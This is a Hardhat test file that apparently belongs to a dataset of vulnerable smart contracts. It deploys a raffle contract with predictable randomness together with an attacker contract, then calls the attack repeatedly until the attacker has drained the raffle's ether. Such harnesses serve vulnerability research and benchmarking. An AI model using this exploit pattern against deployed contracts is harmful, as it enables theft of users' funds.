const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const path = require("path");
const fs = require("fs");

describe("attack bad_randomness/etheraffle.sol", function () {
  async function deployContracts() {
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/bad_randomness/etheraffle.sol/Ethraffle_v4b.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    const Ethraffle_v4b = await ethers.getContractFactory(
      json.abi,
      json.bytecode,
    );
    const victim = await Ethraffle_v4b.deploy();
    await victim.waitForDeployment();

    const Ethraffle_v4bAttacker = await ethers.getContractFactory(
      "contracts/bad_randomness/etheraffle_attack.sol:Ethraffle_v4bAttacker",
    );
    const attacker = await Ethraffle_v4bAttacker.deploy(victim.target);
    await attacker.waitForDeployment();

    return { victim, attacker };
  }

  it("sanity check: bad_randomness/etheraffle.sol", async function () {
    const { victim } = await loadFixture(deployContracts);
    await expect(victim.buyTickets({ value: ethers.parseEther("1") })).to.not.be
      .reverted;
  });

  it("exploit bad randomness vulnerability", async function () {
    const { victim, attacker } = await loadFixture(deployContracts);

    const victimBalanceBefore = await ethers.provider.getBalance(victim.target);
    expect(victimBalanceBefore).to.equal(0);

    const attackerBalanceBefore = await ethers.provider.getBalance(
      attacker.target,
    );
    expect(attackerBalanceBefore).to.equal(0);

    const [v, a] = await ethers.getSigners();
    const amount = ethers.parseEther("2.48");
    await v.sendTransaction({
      to: victim.target,
      value: amount,
    });

    await attacker.setContestants(v.address);

    const attackerAmount = ethers.parseEther("0.0506");
    await a.sendTransaction({
      to: attacker.target,
      value: attackerAmount,
    });

    let attackerBalanceAfter = 0;

    while (attackerBalanceAfter <= attackerAmount) {
      await attacker.attack();
      attackerBalanceAfter = await ethers.provider.getBalance(attacker.target);
    }

    expect(attackerBalanceAfter).to.be.equal(ethers.parseEther("2.5"));
  });
});
